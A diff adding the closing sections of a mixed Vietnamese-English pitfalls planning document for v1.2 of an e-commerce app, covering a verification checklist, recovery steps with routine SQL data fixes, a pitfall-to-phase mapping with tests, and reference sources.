+- [ ] **Flyway:** Verify mọi service boot fresh (drop DB + Flyway migrate from scratch) không collision.
+- [ ] **Playwright:** Verify mọi v1.2 test dùng `data-testid` hoặc `getByRole`, không CSS class selector.
+- [ ] **Playwright:** Verify test không có `waitForTimeout` (chỉ `waitForResponse` / `waitForURL`).
+- [ ] **Cross-cutting:** Verify mọi endpoint mới có header `X-Trace-Id` ở response.
+- [ ] **Cross-cutting:** Verify mọi error 4xx/5xx mới có `ApiErrorResponse {code, message, traceId}` đúng schema.
+- [ ] **Cross-cutting:** Verify FE `services/http.ts` dispatcher decode mọi domainCode mới (review/wishlist/address).
+
+---
+
+## Recovery Strategies
+
+| Pitfall | Recovery Cost | Recovery Steps |
+|---------|---------------|----------------|
+| Flyway V-number collision | LOW | Rename file V_X__ -> V_(X+offset)__, verify history table không có entry cũ; nếu có -> `flyway repair` |
+| Rating average drift | MEDIUM | Một-time SQL: `UPDATE products SET avg_rating = (SELECT AVG(rating) FROM reviews WHERE ...)`. Sửa code recompute pattern |
+| XSS stored trong reviews | HIGH | Nếu đã có data: bulk sanitize qua migration. Audit logs xem có user nào đã victim -> notify, force password reset |
+| Default address conflict (2 row is_default=true) | LOW | SQL: `UPDATE addresses SET is_default = false WHERE user_id = ? AND id != (SELECT MAX(id) FROM addresses WHERE user_id = ? AND is_default = true)`. Add partial unique index |
+| Wishlist duplicate items | LOW | SQL: `DELETE FROM wishlist_items WHERE id NOT IN (SELECT MIN(id) FROM wishlist_items GROUP BY user_id, product_id)`. Add unique index |
+| Account takeover qua password change không verify | HIGH | Force-reset all passwords qua email; revoke all JWT (rotate JWT secret); audit logs |
+| middleware matcher bypass static asset | LOW | Update `config.matcher` exclude pattern; deploy |
+| LCP regression sau homepage redesign | LOW | Revert hero image; audit `next/image priority`; convert sang WebP |
+| Order filter timezone bug | MEDIUM | Backfill: convert existing `LocalDateTime` columns sang `OffsetDateTime` qua migration; FE chuyển TZ |
+| Cache stale featured product | LOW | Clear cache; reduce TTL hoặc invalidate hooks |
+| Avatar polyglot uploaded | MEDIUM | Audit uploaded files; re-encode all qua ImageIO; quarantine suspect |
+| traceId thiếu ở endpoint mới | LOW | Apply filter `/**`, không cần data fix |
+
+---
+
+## Pitfall-to-Phase Mapping
+
+> Ánh xạ giả định roadmap v1.2 sẽ chia thành ~5 phases (residual closure, account, discovery, checkout+homepage polish, integration verify). Roadmap agent có thể restructure.
+
+| # | Pitfall | Prevention Phase (proposed) | Verification |
+|---|---------|------------------------------|--------------|
+| 1 | Flyway V4 collision | Roadmap setup (pre-phase) + integration verify phase | All services boot fresh from clean DB |
+| 2 | AUTH-06 middleware matcher | Phase 9 — Residual closure | Playwright direct-visit test |
+| 3 | Reviews XSS | Phase — Reviews | Playwright XSS payload test |
+| 4 | Rating average drift | Phase — Reviews | Integration test edit/delete cycle assert avg recomputed |
+| 5 | Reviews N+1 | Phase — Reviews | `show-sql=true`, count queries per request |
+| 6 | Address soft vs hard delete | Phase — Address book | Integration test delete address -> order intact |
+| 7 | Default-flag concurrency | Phase — Address book | Migration include partial unique index; concurrent test |
+| 8 | Password change without oldPassword | Phase — Profile editing | Integration test reject without oldPassword |
+| 9 | Email change without verify | Phase — Profile editing | UI disable hoặc 2-step flow test |
+| 10 | Avatar upload bypass | Phase — Profile editing | Penetration test polyglot/oversized/path-traversal |
+| 11 | Order filter timezone | Phase — Order filtering | Boundary test 23:59 GMT+7 |
+| 12 | Order filter injection | Phase — Order filtering | OpenAPI enum sync + invalid param test |
+| 13 | Pagination drift | Phase — Order filtering | Document tech debt (offset acceptable v1.2) |
+| 14 | Wishlist duplicate + stale stock | Phase — Wishlist | Migration unique index + JOIN live product test |
+| 15 | Wishlist memory leak | Phase — Wishlist | Lighthouse memory profile |
+| 16 | Facet count staleness | Phase — Advanced filters | No-cache contract documented |
+| 17 | Filter OR/AND + URL state | Phase — Advanced filters | URL size test + multi-facet logic test |
+| 18 | Hero LCP regression | Phase — Homepage redesign | Lighthouse CI gate |
+| 19 | Featured cache mismatch | Phase — Homepage redesign | No-cache documented |
+| 20 | Gallery a11y | Phase — Product detail | axe-core in Playwright |
+| 21 | Breadcrumb mismatch | Phase — Product detail | SSR `/products/[slug]` |
+| 22 | Admin KPI cross-service N+1 | Phase 9 — UI-02 closure | `/stats` endpoint per service + Promise.all |
+| 23 | KPI cache vs realtime | Phase 9 — UI-02 closure | No-cache + "last refresh" UI |
+| 24 | Playwright stale selectors + race | Phase 9 — Playwright re-baseline | `data-testid` audit + waitForResponse |
+| 25 | traceId missing on new endpoints | Integration verify phase | Header check on all new endpoints |
+| 26 | ApiErrorResponse missing branches | Integration verify phase | Trigger every error code, assert FE handle |
+
+---
+
+## Sources
+
+- `.planning/milestones/v1.1-MILESTONE-AUDIT.md` — 4 PARTIAL gaps (DB-05 Flyway, AUTH-06 matcher, UI-02 dashboard, PERSIST-01 cart-side)
+- `.planning/debug/login-redirect-cart-stock.md` — root cause http.ts 401 redirect áp dụng cho auth endpoints + CartItem thiếu stock snapshot
+- `.planning/debug/products-list-500.md` — historic incident reference
+- `.planning/PROJECT.md` — visible-first priority, defer backend hardening invisible
+- Spring Boot reference: Bean Validation + `@PreAuthorize` + multipart config
+- OWASP Java HTML Sanitizer (https://github.com/OWASP/java-html-sanitizer)
+- Next.js middleware matcher syntax (https://nextjs.org/docs/app/building-your-application/routing/middleware#matcher)
+- Postgres partial unique index (https://www.postgresql.org/docs/current/indexes-partial.html)
+- Flyway versioning best practices (https://flywaydb.org/documentation/concepts/migrations#versioned-migrations)
+- Radix UI Dialog focus trap (https://www.radix-ui.com/primitives/docs/components/dialog)
+- Playwright best practices: `getByRole`, `data-testid`, `waitForResponse`
+
+---
+
+*Pitfalls research scope: ADDING v1.2 features tới existing v1.1 baseline.*
+*Researched: 2026-04-26.*
+*Confidence: HIGH — pitfalls grounded trực tiếp trong v1.1 incidents (Flyway V2, login redirect, cart stock bypass) + standard microservices/Next.js gotchas.*
